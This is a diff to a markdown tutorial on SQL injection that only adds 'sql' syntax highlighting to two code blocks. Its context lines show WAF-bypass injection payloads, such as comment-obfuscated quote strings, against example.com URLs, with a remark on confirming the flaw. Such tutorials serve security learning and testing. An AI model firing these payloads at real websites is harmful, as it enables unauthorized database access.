@@ -149,7 +149,7 @@ This one is the easiest of all SQLi attacks.
 > - In some cases, WAF won't let you to cause errors on the website, so sending special queries might be needed to bypass WAF. If no WAF warnings are shown and website loads successfully, we can confirm that the vulnerability exists.
 
 > - We should try the following payloads.
-> ```
+> ```sql
 > https://www.example.com/index.php?id=1'--/**/-
 > https://www.example.com/index.php?id=/*!500001'--+-*/
 > https://www.example.com/index.php?id=1/^.*1'--+-.*$/
@@ -169,7 +169,7 @@ This one is the easiest of all SQLi attacks.
 > ```
 
 > - Payloads
-> ```
+> ```sql
 > '--/**/-
 > /*!500001'--+-*/
 > /^.*1'--+-.*$/
